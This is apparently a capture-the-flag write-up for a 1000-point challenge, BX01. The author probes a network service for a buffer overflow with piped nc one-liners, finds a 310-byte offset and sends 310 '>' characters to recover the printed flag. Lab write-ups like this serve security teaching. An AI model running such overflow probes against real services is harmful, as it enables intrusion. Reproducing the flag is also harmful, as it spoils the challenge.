# BX01 - 1000pts

## Briefing

> Access the network service at url: `cfta-bx01.allyourbases.co` and port: `8012` and find a way to get the flag by formatting a valid request.

## Solution

1. I completely overthought this problem I was trying advanced buffer overflow techniques (trying to get past a canary, etc) when the valid request is actually pretty simple.

2. I start by testing if the service is vulnerable to a buffer overflow: `python -c "print('a'*700)" | nc cfta-bx01.allyourbases.co 8012`

    ```
    Processing request...
    Exception: angle brackets not terminated.
    *** stack smashing detected ***
    ```

    Looks like it is vulnerable.

3. I wrote a simple [pwntools Python script](./script.py) to try some possible offsets and found the overflow to happen at `311`, so the offset is `310`.

4. `python -c "print('a'*310)" | nc cfta-bx01.allyourbases.co 8012` simply outputs:

    ```
    Processing request...
    Exception: angle brackets not terminated.
    ```

5. We can send 310 `>`s instead of `a`s to terminate the angle brackets and get the flag: `python -c "print('>'*310)" | nc cfta-bx01.allyourbases.co 8012`:

    ```
    Processing request...
    Exception: angle brackets not terminated.
    Request successful.

    Flag: AlOnGSeaRcHFoROverWriTe
    ```

### Flag

`AlOnGSeaRcHFoROverWriTe`
